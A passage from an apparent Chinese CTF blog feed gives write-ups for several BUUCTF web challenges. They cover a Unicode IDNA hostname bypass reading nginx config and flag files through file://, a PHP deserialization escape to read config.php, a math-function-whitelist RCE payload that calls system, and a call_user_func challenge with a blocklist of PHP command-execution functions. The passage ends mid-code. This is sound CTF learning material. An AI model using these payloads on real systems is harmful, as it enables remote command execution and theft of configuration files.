class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        uni<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">"http://suctf.c&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>uni<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> url    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span>       </code></pre>//运行结果      str: ℂ unicode: \u2102str: ℭ unicode: \u212dstr: Ⅽ unicode: \u216dstr: ⅽ unicode: \u217dstr: Ⓒ unicode: \u24b8str: ⓒ unicode: \u24d2str: Ｃ unicode: \uff23str: ｃ unicode: \uff43</code></pre><p>把最后一个c替换即可<br>题目提示nginx，读取nginx的文件         </p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?url=file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf</code><br>然后读取flag<br>payload:<code>?url=file://suctf.cⅭ/usr/fffffflag</code>     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题042</title>
    <link href="/2021/03/02/BUU042/"/>
    <url>/2021/03/02/BUU042/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[0CTF 2016]piapiapia<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c2d7bb4e15e7e536.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>www.zip</code>泄露<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f14c9ff26da419bd.png"><br>主要利用点：    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   </code></pre></code></pre><p><code>file_get_contents</code><br>读取<code>config.php</code>      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>       </code></pre></code></pre><p><code>update.php</code>      </p><pre><code>```php&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] == null) &#123;        die(&#39;Login First&#39;);        &#125;    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;        $username = $_SESSION[&#39;username&#39;];        if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))            die(&#39;Invalid phone&#39;);        if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))            die(&#39;Invalid email&#39;);        if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);        $file = $_FILES[&#39;photo&#39;];        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)            die(&#39;Photo size error&#39;);        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));        $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];        $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];        $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];        $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);        $user-&gt;update_profile($username, serialize($profile));        echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;    &#125;    else &#123;      </code></pre><p>有个<code>serialize</code>序列化<br><code>class.php</code>里的替换函数      </p><pre><code>public function filter($string) &#123;    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;    $string = preg_replace($escape, &#39;_&#39;, $string);    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;    return preg_replace($safe, &#39;hacker&#39;, $string);&#125;         </code></pre><p>where替换为hacker五位变成了六位  </p><ul><li><p>反序列化字符逃逸      </p><pre><code>  a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;         //结果         Array  (      [phone] =&gt; 12345678912      [email] =&gt; 123456@qq.com      [nickname] =&gt; 123      [photo] =&gt; upload/562bd805ee2353360acb87cf40a48b19  )</code></pre></li></ul><pre><code>    a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;          //结果           Array    (        [phone] =&gt; 12345678912        [email] =&gt; 123456@qq.com        [nickname] =&gt; 123        [photo] =&gt; config.php    )        </code></pre><p><code>&#125;</code>提前出现，反序列化就会提前结束<br>替换会多一位，多余的位会将原来的挤出来，也就是只会根据前面的数值规定的几位来读，读到规定的位数，这一块反序列化就停止了；而多余的那部分会被认为是下一块<br><code>;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>将这一块从nickname里挤出来，就成photo里的了，然后就能读出<code>config.php</code>       </p><p>nickname有长度限制可以用数组<br>数组的序列化是以<code>&#123;&#125;</code>括住的<br>所以上面的前面要加一个<code>&#125;</code>闭合数组的序列化<br><code>where*34&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>在<code>update.php</code>里上传抓包<br>改nickname伪数组和其内容<br><img src="https://ftp.bmp.ovh/imgs/2021/03/ccbc2725f789e2d3.png">     </p><p>然后在<code>profile.php</code>图片的base64解码即可得到flag        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题041</title>
    <link href="/2021/03/01/BUU041/"/>
    <url>/2021/03/01/BUU041/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[CISCN 2019 初赛]Love Math<br>代码审计—–RCE      </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\t'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\r'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'"'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'abs'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'acos'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'acosh'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'asin'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'asinh'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'atan2'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'atan'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'atanh'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'base_convert'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'bindec'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'ceil'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'cos'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'cosh'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'decbin'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'dechex'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'decoct'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'exp'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'expm1'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'floor'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'fmod'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'hexdec'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'hypot'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'is_finite'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'is_nan'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'log10'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'log1p'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'log'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'max'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'min'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'octdec'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pi'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pow'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'rand'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'round'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'sin'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'sinh'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'sqrt'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'srand'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'tan'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//帮你算出答案</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       </span></code></pre></code></pre><p>需要用whitelist中的函数构造命令执行     </p><ul><li>几个函数       <ol><li><code>base_convert</code>—-&gt;在任意进制之间转换数字      </li><li><code>hex2bin</code>—–&gt;转换十六进制字符串为二进制字符串       </li><li><code>bin2hex</code>—–&gt;把包含数据的二进制字符串转换为十六进制值      </li><li><code>hexdec</code>——&gt;十六进制转换为十进制  </li><li><code>dechex</code>——&gt;十进制转换为十六进制     </li></ol></li></ul><p>所要构造的payload：<code>?c=$_GET[a]($_GET[b])</code>然后传入<code>&amp;a=system&amp;b=cat /flag</code><br>中括号可以用花括号替代<br>能转成字符串的只有hex2bin了，<br>用<code>base_convert</code>，十进制转化为三十六进制，base36中有字母和数字        </p><pre><code>echo base_convert(&quot;hex2bin&quot;,36,10);      37907361743         </code></pre><p><code>bin2hex</code>将<code>_GET</code>转为十六进制,dechex转为十进制        </p><pre><code>echo hexdec(bin2hex(&#39;_GET&#39;));      1598506324      </code></pre><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>c=$pi=(base_convert(37907361743,10,36)(dechex(1598506324)));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=ls</code><br><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">MORE</a>      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题040</title>
    <link href="/2021/02/28/BUU040/"/>
    <url>/2021/02/28/BUU040/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF 2nd]假猪套天下第一     </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题就是那种改header，加header的题<br>主要记一下涉及的几个header        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ab0d1ef0567bdf.png">       </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>Via：通知中间网关或代理服务器地址，通信协议      </li><li>From: 发出请求的用户的Email        </li><li>Date:请求发送的日期和时间</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题039</title>
    <link href="/2021/02/27/BUU039/"/>
    <url>/2021/02/27/BUU039/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]phpweb<img src="https://ftp.bmp.ovh/imgs/2021/02/fc3331b9a95a064c.png">        </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一段报错信息      </p><pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 242021-02-27 06:14:05 am        </code></pre><p>而且没五秒页面会刷新一次  </p><p>抓包看看<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png"><br>前面一个date,后面是时间—–函数执行<br>读取<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"touch"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"substr_replace"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"call_user_func"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_filter"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"array_map"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"filter_var"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uasort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"uksort"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_reduce"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"array_walk"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwrite"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token 